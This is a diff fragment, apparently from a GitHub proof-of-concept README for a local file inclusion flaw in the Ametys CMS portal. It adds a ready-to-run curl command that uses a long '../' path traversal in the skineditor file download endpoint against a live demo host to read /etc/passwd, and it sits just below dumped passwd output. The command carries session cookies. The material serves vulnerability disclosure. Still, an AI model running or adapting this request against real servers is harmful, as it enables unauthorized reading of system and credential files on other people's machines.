@@ -101,6 +101,13 @@ dhcpcd:x:117:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
 polkitd:x:995:995:User for polkitd:/:/usr/sbin/nologin
 
 ```
+### Curl Command
+```
+ curl -s --path-as-is -X POST \
+  https://demo.ametys.org/cms/plugins/skineditor/file/download?path=../../../../../../../../../../../../../../../../etc/passwd \
+  -H 'Cookie: JSESSIONID=257F55E55C3344E7F4FFA5810A1E3A96; tarteaucitron=!gajs=false!matomocloud=false!googlemaps=false!gagenda=false!sharethis=false!dailymotion=false!youtube=false!youtubeplaylist=false; JSESSIONID=DC788DBC176BFB0787DA25FC2C93CE63; _pk_id.2.afd3=4f757134bce0bed6.1754326045.; _ga_2VTM1RYFX8=GS2.1.s1754331048$o1$g1$t1754331054$j54$l0$h0; JSESSIONID-Ametys=719D9B1BA49FE4046DFB966F28FBB385'
+```
+![Ametys Portal 4.4](https://raw.githubusercontent.com/capture0x/Ametys-LFI/refs/heads/main/ame.png)
 
 ### Video
 
